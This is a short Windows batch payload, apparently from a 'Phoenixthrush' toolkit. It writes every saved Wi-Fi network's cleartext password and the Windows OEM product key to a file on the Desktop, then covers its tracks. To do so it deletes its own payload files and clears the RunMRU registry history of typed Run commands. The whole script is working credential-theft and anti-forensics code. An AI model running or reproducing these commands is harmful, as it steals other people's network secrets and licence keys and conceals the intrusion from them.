CHCP 65001
cmd /c echo %date% %time% >> %userprofile%\Desktop\phoenix.txt"
powershell -command "netsh wlan show profile * key=clear" >> %userprofile%\Desktop\phoenix.txt
powershell -command "wmic path softwarelicensingservice get OA3xOriginalProductKey" >> %userprofile%\Desktop\phoenix.txt
del current_payload.zip
del run.vbs
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
cmd /c del C:\Users\payload.bat
exit

REM Copyright Phoenixthrush